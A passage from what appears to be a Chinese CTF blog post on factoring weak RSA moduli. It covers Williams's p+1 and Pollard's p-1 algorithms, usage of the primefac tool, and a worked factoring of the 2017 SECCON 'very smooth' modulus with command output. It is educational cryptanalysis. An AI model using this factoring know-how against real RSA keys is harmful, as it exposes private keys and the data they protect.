<h3 id="0x5-Williams-39-s-p-1-算法"><a href="#0x5-Williams-39-s-p-1-算法" class="headerlink" title="0x5 Williams&#39;s p + 1 算法"></a>0x5 Williams&#39;s p + 1 算法</h3><p>Pollard&#39;s p-1算法比较容易懂，但是Williams’s p+1算法却不怎么让人明白！</p>
<h4 id="5-1-算法"><a href="#5-1-算法" class="headerlink" title="5.1 算法"></a>5.1 算法</h4><p>选择大于2的整数A，用其生成一个卢卡斯序列：</p>
<p>$V_0=2, V_1=A,V_j=AV_{j-1}-V_{j-2}$</p>
<h3 id="0xn-smooth质数"><a href="#0xn-smooth质数" class="headerlink" title="0xn smooth质数"></a>0xn smooth质数</h3><h4 id="n-1-p-1-光滑"><a href="#n-1-p-1-光滑" class="headerlink" title="n.1 p - 1 光滑"></a>n.1 p - 1 光滑</h4><p>当 p 是 N 的因数，并且 p - 1 是光滑的时候，可能可以使用 Pollard&#39;s p − 1 算法来分解 N，但是也不是完全可以成功的。</p>
<h4 id="n-2-p-1-光滑"><a href="#n-2-p-1-光滑" class="headerlink" title="n.2 p + 1 光滑"></a>n.2 p + 1 光滑</h4><p>当 p 是 n 的因数，并且 p + 1 是光滑的时候，可能可以使用 Williams&#39;s p + 1 算法来分解 N，但是也不是完全可以成功的。</p>
<h4 id="n-3-primefac包"><a href="#n-3-primefac包" class="headerlink" title="n.3 primefac包"></a>n.3 primefac包</h4><p>上面的两种光滑，都可以使用包<a href="https://pypi.python.org/pypi/primefac" target="_blank" rel="external">primefac</a> 来做</p>
<p>primefac是一个贼好用的工具，环境一般在linux上，cygwin上也能用，运行速度贼快！</p>
<font color="#f00">不能在windows上使用的原因</font>

<p>在Windows中，多进程multiprocessing使用的是序列化pickle来在多进程之间转移数据，而socket对象是不能被序列化的，但是在linux操作系统上却没问题，因为在linux上多进程multiprocessing使用的是fork，所以在windows上可以改用多线程。</p>
<p>常用的命令行使用方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python -m primefac [-vs] [-v|--verbose] [-s|--summary] [-t=NUM] [-r=NUM]</div><div class="line">                [-m=[prb][,p-1][,p+1][,ecm][,mpqs]] rpn</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line">rpn is an expression in revese Polish notation and is evaluated using integer arithmetic. Each number that remains on the stack after evaluation is then factored.</div><div class="line"></div><div class="line">-t sets the trial division limit; the default value is 1000. Use -t=inf to use trial division exclusively.</div><div class="line"></div><div class="line">-r sets the number of rounds of Pollard’s rho algorithm to try before calling a factor “difficult”. The default value is 42,000. Use -r=inf to use Pollard’s rho exclusively once the trial division is completed.</div><div class="line"></div><div class="line">If verbosity is invoked, we indicate in the output which algorithm produced which factors during the multifactor phase.</div><div class="line"></div><div class="line">If the -s (or --summary) flag is absent, then output is identical to the output of the GNU factor command, except possibly for the order of the factors and, if verbosity has been turned on, the annotations indicating which algorithm produced which factors.</div><div class="line"></div><div class="line">If the -s (or --summary) flag is present, then output is modified by adding a single newline between each item’s output, before the first item, and after the last item. Each item’s output is also modified by printing a second line of data summarizing the results by describing the number of decimal digits in the input, the number of decimal digits in each prime factor, and the factors’ multiplicities</div><div class="line"></div><div class="line">The -v and -s flags may be combined into a single flag in either order — i.e., into -vs or -sv.</div><div class="line"></div><div class="line">The -m= flag controls the functions used during the multifactor phase. The options are prb, p-1, p+1, ecm, and mpqs, representing Pollard’s rho, Pollard’s p-1, Williams’ p+1, the elliptic curve method, and the multiple polynomial quadratic sieve, respectively. The options must be separated by commas. The options can be repeated: if prb is listed twice, for example, then multifactor will run two instances of pollardRho_brent simultaneously. In the case of prb and ecm, this decreases the expectation value of the time to find a factor, whereas the other three algorithms (p-1, p+1, and MPQS) have no randomized component so that running duplicate instances of these three algorithms confers no benefit. We therefore ignore repeated listings of the latter three methods: for example, calling</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m primefac -m=prb,prb,ecm,ecm,ecm,mpqs,mpqs 38 ! 1 +</div></pre></td></tr></table></figure>
<p>从上面的说明中可以看出，primefac可以使用多种常用的分解质因数的方法，而rpn时使用逆波兰表示法表示的数。</p>
<h4 id="n-4-整数分解的方法"><a href="#n-4-整数分解的方法" class="headerlink" title="n.4 整数分解的方法"></a>n.4 整数分解的方法</h4><ul>
<li><a href="https://en.wikipedia.org/wiki/Trial_division" target="_blank" rel="external">Trial division</a></li>
<li><a href="https://en.wikipedia.org/wiki/Wheel_factorization" target="_blank" rel="external">Wheel factorization</a></li>
<li><a href="https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm" target="_blank" rel="external">Pollard&#39;s rho algorithm</a></li>
<li><a href="https://en.wikipedia.org/wiki/Algebraic-group_factorisation_algorithms" target="_blank" rel="external">Algebraic-group factorisation algorithms</a>, among which are <a href="https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm" target="_blank" rel="external">Pollard&#39;s <em>p</em> − 1 algorithm</a>, <a href="https://en.wikipedia.org/wiki/Williams%27_p_%2B_1_algorithm" target="_blank" rel="external">Williams&#39; <em>p</em> + 1 algorithm</a>, and <a href="https://en.wikipedia.org/wiki/Lenstra_elliptic_curve_factorization" target="_blank" rel="external">Lenstra elliptic curve factorization</a></li>
<li><a href="https://en.wikipedia.org/wiki/Fermat%27s_factorization_method" target="_blank" rel="external">Fermat&#39;s factorization method</a></li>
<li><a href="https://en.wikipedia.org/wiki/Euler%27s_factorization_method" target="_blank" rel="external">Euler&#39;s factorization method</a></li>
<li><a href="https://en.wikipedia.org/wiki/Special_number_field_sieve" target="_blank" rel="external">Special number field sieve</a></li>
</ul>
<h3 id="0xn-1-ctf中范例"><a href="#0xn-1-ctf中范例" class="headerlink" title="0xn+1 ctf中范例"></a>0xn+1 ctf中范例</h3><h4 id="n-1-1-2017-SECCON-very-smooth"><a href="#n-1-1-2017-SECCON-very-smooth" class="headerlink" title="n+1.1 2017 SECCON very smooth"></a>n+1.1 2017 SECCON very smooth</h4><p>将题目从文件中binwalk出来之后，发现了一个证书，给出了大整数n</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python -m primefac -vs -m=p+1  149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</div><div class="line"></div><div class="line">149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897: p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</div><div class="line">Z309  =  P155 x P155  =  11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</div></pre></td></tr></table></figure>
<p>至于这里为什么只能用Williams&#39;s <em>p</em> + 1 算法而不能用 Pollard&#39;s p − 1 算法分解，其原因可能如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜ python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002</div><div class="line"></div><div class="line">1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002: 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823</div><div class="line">Z154  =  P1 x P1 x P2 x P3 x P6 x P142  =  2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823</div><div class="line"></div><div class="line">➜ python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 </div><div class="line"></div><div class="line">1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000: 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5</div><div class="line">Z154  =  P1^185 x P1^62 x P1^97  =  2^185 x 3^62 x 5^97</div></pre></td></tr></table></figure>
<p>其实从此处看出，对于 p-1 确实有很多小因子，但是个数太多，这就会使得进行枚举的时候出现指数爆炸的情况，因此没有分解出来。</p>
<h4 id="n-1-2-2018-Backdoor-Awesome-mix2"><a href="#n-1-2-2018-Backdoor-Awesome-mix2" class="headerlink" title="n+1.2 2018 Backdoor Awesome-mix2"></a>n+1.2 2018 Backdoor Awesome-mix2</h4><p>这道题是一道验证题，但是需要解决一个问题：</p>
<p>已知s，m，（都是不超过1024位的大整数），求使得 $s^e=m(mod n)$ 的 e和n，约束条件是:</p>
<p>$e&gt;=3, n&gt;=s, n.bit_length &lt;= 1025$</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/me.jpg"
               alt="Introspelliam" />
          <p class="site-author-name" itemprop="name">Introspelliam</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
            
              <a href="/archives/">
            
                <span class="site-state-item-count">129</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">15</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">54</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                    
                      Weibo
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Introspelliam</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  








  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
  


  

  

</body>
</html>
